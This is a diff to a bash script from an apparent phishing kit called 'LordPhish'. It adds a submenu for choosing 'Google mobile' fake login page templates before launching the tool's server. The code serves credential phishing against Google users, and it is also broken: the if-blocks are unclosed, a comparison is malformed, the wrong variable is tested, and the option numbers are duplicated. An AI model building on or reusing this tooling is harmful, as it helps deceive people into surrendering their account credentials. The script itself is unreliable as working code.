@@ -313,6 +313,28 @@ start
     
 if [[ $option == "2" || $option "02"]]; then
 list_gm
+
+else
+printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[0m\e[1;96m Invalid option\e[0m\n"
+sleep 0.9
+clear
+menu
+}
+
+list_gm() {
+    clear
+    banner
+    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google mobile1 \e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google mobile2 \e[0m\n"
+    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' list_gm
+    
+if [[ $option == "1" || $option "01"]]; then
+server="Google_mobile"
+start
+    
+if [[ $option == "2" || $option "02"]]; then
+server="Google_mobile2"
+start
     
 }
 
